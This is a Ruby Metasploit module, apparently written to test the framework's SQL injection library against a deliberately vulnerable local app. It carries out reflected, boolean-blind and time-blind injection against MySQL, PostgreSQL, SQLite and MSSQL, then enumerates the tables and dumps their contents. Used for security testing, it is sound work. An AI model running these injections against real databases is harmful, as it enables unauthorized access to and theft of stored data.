# frozen_string_literal: true

require 'socket'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PostgreSQL injection testing module',
        'Description' => '
          This module tests the SQL injection library against a vulnerable application from https://github.com/red0xff/sqli_vulnerable
        ',
        'Author' =>
          [
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          ['URL', 'https://github.com/red0xff/sqli_vulnerable/tree/main/postgresql'],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        OptInt.new('RPORT', [true, 'The target port', 1337]),
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind.', 0]),
        OptBool.new('SAFE', [false, 'Use safe mode', false]),
        OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
        OptBool.new('HEX_ENCODE_STRINGS', [false, 'Replace strings in the query with hex numbers?', false]),
        OptInt.new('TRUNCATION_LENGTH', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0]),
        OptInt.new('DBMS', [ true, '0)MySQL/MariaDB. 1) PostgreSQL. 2) Sqlite. 3) MSSQL.', 0])
      ]
    )
  end

  def boolean_blind
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = create_sqli(dbms: @dbms, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
                         concat_separator: '@',
                         second_concat_separator: '#'
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
      sock.puts('0 or ' + payload + ' --')
      res = sock.gets.chomp
      sock.close
      res && !res.include?('No results')
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def reflected
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    truncation = datastore['TRUNCATION_LENGTH'] <= 0 ? nil : datastore['TRUNCATION_LENGTH']
    sqli = create_sqli(dbms: @dbms, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
                         truncation_length: truncation,
                         safe: datastore['SAFE'],
                         concat_separator: '@',
                         second_concat_separator: '#'
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
      sock.puts('0 union ' + payload)
      res = sock.gets&.chomp
      sock.close
      truncation ? res[0, truncation] : res
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def time_blind
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = create_sqli(dbms: @dbms, opts: {
                         encoder: encoder,
                         hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
                         concat_separator: '@',
                         second_concat_separator: '#'
                       }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])

      if datastore['DBMS'] == 3 # MSSQL
        sock.puts("0;#{payload} --")
      else
        sock.puts('0 or ' + payload + ' --')
      end

      sock.gets
      sock.close
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def perform_sqli(sqli)
    print_good "dbms version: #{sqli.version}"
    tables = sqli.enum_table_names
    print_good "tables: #{tables.join(', ')}"
    tables.each do |table|
      columns = sqli.enum_table_columns(table)
      print_good "#{table}(#{columns.join(', ')})"
      content = sqli.dump_table_fields(table, columns)
      content.each do |row|
        print_good "\t" + row.join(', ')
      end
    end
  end

  def run
    case datastore['SQLI_TYPE']
    when 0
      @dbms = case datastore['DBMS']
        when 0 then Msf::Exploit::SQLi::MySQLi::Common
        when 1 then Msf::Exploit::SQLi::PostgreSQLi::Common
        when 2 then Msf::Exploit::SQLi::SQLitei::Common
        when 3 then Msf::Exploit::SQLi::Mssqli::Common
        else print_bad("Unsupported target")
      end
      reflected
    when 1
      @dbms = case datastore['DBMS']
        when 0 then Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind
        when 1 then Msf::Exploit::SQLi::PostgreSQLi::BooleanBasedBlind
        when 2 then Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind
        when 3 then Msf::Exploit::SQLi::Mssqli::BooleanBasedBlind
        else print_bad("Unsupported target")
      end
      boolean_blind
    when 2
      @dbms = case datastore['DBMS']
        when 0 then Msf::Exploit::SQLi::MySQLi::TimeBasedBlind
        when 1 then Msf::Exploit::SQLi::PostgreSQLi::TimeBasedBlind
        when 2 then Msf::Exploit::SQLi::SQLitei::TimeBasedBlind
        when 3 then Msf::Exploit::SQLi::Mssqli::TimeBasedBlind
        else print_bad("Unsupported target")
      end
      time_blind
    else
      print_bad('Unsupported SQLI_TYPE')
    end
  end
end
